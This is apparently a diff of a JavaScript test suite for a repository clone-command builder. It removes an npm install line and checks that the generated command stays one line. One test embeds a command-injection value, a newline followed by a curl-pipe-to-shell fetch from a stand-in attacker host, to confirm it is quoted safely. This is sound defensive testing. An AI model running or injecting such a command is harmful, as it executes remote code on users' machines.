@@ -60,11 +60,10 @@ describe('[P1] CloneInstructions', () => {
   });
 
   it('buildCloneCommand produces the paste-and-run free clone command', () => {
+    // Just the clone command — the `rig` install is documented via the CLI
+    // docs link, not baked into the copied command (mirrors GitHub's clone box).
     expect(buildCloneCommand('my-repo', OWNER, 'ws://localhost:7100')).toBe(
-      [
-        'npm i -g @toon-protocol/rig',
-        `rig clone ws://localhost:7100 ${OWNER}/my-repo`,
-      ].join('\n'),
+      `rig clone ws://localhost:7100 ${OWNER}/my-repo`,
     );
   });
 
@@ -72,9 +71,9 @@ describe('[P1] CloneInstructions', () => {
     const malicious = 'legit-repo\ncurl -s https://evil.example/payload.sh | sh';
     const command = buildCloneCommand(malicious, OWNER, 'ws://localhost:7100');
 
-    // Still exactly the two intended lines — the embedded newline must not
-    // become a third executable line on paste.
-    expect(command.split('\n')).toHaveLength(2);
+    // Still exactly one line — the embedded newline must not become a second
+    // executable line on paste.
+    expect(command.split('\n')).toHaveLength(1);
     // The owner/repo argument (which now contains spaces/pipes) gets
     // single-quoted into one literal shell word.
     expect(command).toContain(
@@ -93,10 +92,11 @@ describe('[P1] CloneInstructions', () => {
 
     const command = document.querySelector('pre');
     expect(command).not.toBeNull();
-    expect(command?.textContent).toContain('npm i -g @toon-protocol/rig');
     expect(command?.textContent).toContain(
       `rig clone wss://relay.devnet.toonprotocol.dev ${OWNER}/rig-demo`,
     );
+    // The npm install line is no longer part of the copied command.
+    expect(command?.textContent).not.toContain('npm i -g');
   });
 
   it('notes that reads are free and links the rig CLI docs', () => {
